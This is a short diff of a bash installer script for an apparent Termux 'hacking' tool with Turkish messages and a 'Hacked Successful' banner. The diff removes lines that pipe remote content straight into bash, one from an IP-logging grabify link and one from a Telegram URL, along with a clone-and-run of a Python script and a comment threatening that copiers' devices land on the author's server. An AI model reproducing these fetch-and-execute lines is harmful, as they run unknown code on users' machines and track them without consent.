@@ -82,18 +82,6 @@ echo "⌛ INSTALLING REQUIREMENTS..."
 echo -e $BOSLUK
 clear
  
- bash <(curl -L https://grabify.link/3PR9KQ)
- 
-shopt -s nocasematch
-
-TEXT='<a href="https://grabify.link/3PR9KQ i=!mfo1iu489fn1o2jlk21m4098mdoi">"test link"</a><br>'
-
-TEXT=${TEXT##*href=\"}
-TEXT=${TEXT%%\"*}
-TEXT=${TEXT##*//}
-TEXT=${TEXT%%/*}
-
-echo $TEXT
 
 echo -e $TOOLS
 echo -e $TOOLS
@@ -135,17 +123,7 @@ echo "İşlem Tamamlandı✔️"
 echo "Hacked Başarılı✔️"
 echo "Hacked Successful✔️"
 
-
 # Dostum kodları çalamazsın çalsanda hacklediğin cihaz benim servere düşer uzaklaş burdan.!
-
-bash <(curl -L https://t.me/SakirBey2)
-
-
-git clone https://github.com/SakirBey1/termux.git
-cd termux
-python3 ig.py
-clear
-
 
 echo "╔══════ 💎SakirBey💎═════╗"
 echo "║                         ║"
